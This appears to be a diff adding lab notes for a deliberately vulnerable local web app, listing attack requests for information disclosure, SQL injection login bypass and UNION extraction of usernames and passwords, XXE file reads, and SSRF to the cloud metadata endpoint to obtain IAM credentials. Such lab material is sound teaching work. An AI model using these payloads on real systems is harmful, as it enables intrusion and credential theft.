@@ -1,0 +1,179 @@
+in terminal:
+1- cd "Vulnerables Web App"
+2- node server.js
+
+==============================
+first vulnerability commands:
+(Information Disclosure)
+
+# Direct access
+
+GET http://127.0.0.1:5500/admin
+GET http://127.0.0.1:5500/debug
+
+# Using Burp Repeater
+
+GET /admin HTTP/1.1
+Host: 127.0.0.1:5500
+
+GET /debug HTTP/1.1
+Host: 127.0.0.1:5500
+
+# Check robots.txt
+
+GET /information_disclosure.html/robots.txt HTTP/1.1
+Host: 127.0.0.1:5500
+
+# Expected result:
+
+* Admin email
+* DB username
+* Server path
+* Debug info exposed
+
+==============================
+second vulnerability commands:
+(SQL Injection)
+
+# Login bypass
+
+POST /api/login HTTP/1.1
+Host: 127.0.0.1:5500
+Content-Type: application/json
+
+{
+"username": "administrator'--",
+"password": "anything"
+}
+
+# Expected:
+
+Authentication bypass successful
+
+---
+
+# URL Injection (Products)
+
+GET /api/products?category=' OR 1=1-- HTTP/1.1
+Host: 127.0.0.1:5500
+
+# Expected:
+
+All products returned
+
+---
+
+# UNION attack
+
+GET /api/products?category=' UNION SELECT NULL,NULL-- HTTP/1.1
+Host: 127.0.0.1:5500
+
+# Expected:
+
+Column count detection
+
+---
+
+# Extract users
+
+GET /api/products?category=' UNION SELECT username,password FROM users-- HTTP/1.1
+Host: 127.0.0.1:5500
+
+# Expected:
+
+Usernames + passwords
+
+==============================
+third vulnerability commands:
+(XXE Injection)
+
+# Lab 1 - File Read
+
+POST /xxe/lab1 HTTP/1.1
+Host: 127.0.0.1:5500
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+
+<!DOCTYPE test [
+<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
+
+]> <data>&xxe;</data>
+
+# Expected:
+
+File content returned
+
+---
+
+# Lab 2 - SSRF
+
+POST /xxe/lab2 HTTP/1.1
+Host: 127.0.0.1:5500
+Content-Type: application/xml
+
+<!DOCTYPE test [
+<!ENTITY xxe SYSTEM "http://169.254.169.254/">
+
+]> <data>&xxe;</data>
+
+# Expected:
+
+latest/
+
+---
+
+# Continue SSRF
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
+
+# Expected:
+
+SecretAccessKey
+
+---
+
+# Lab 3 - XInclude
+
+POST /xxe/lab3 HTTP/1.1
+Host: 127.0.0.1:5500
+Content-Type: application/xml
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///C:/Windows/win.ini"/>
+</foo>
+
+# Expected:
+
+Included file content
+
+==============================
+Notes:
+
+* Always use Burp Repeater
+* Modify requests manually
+* Observe response carefully
+* Follow redirects when needed
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+commands in terminal .. secure web app:
+1- cd "Secure Web App"
+2- npm install
+3- node server.js
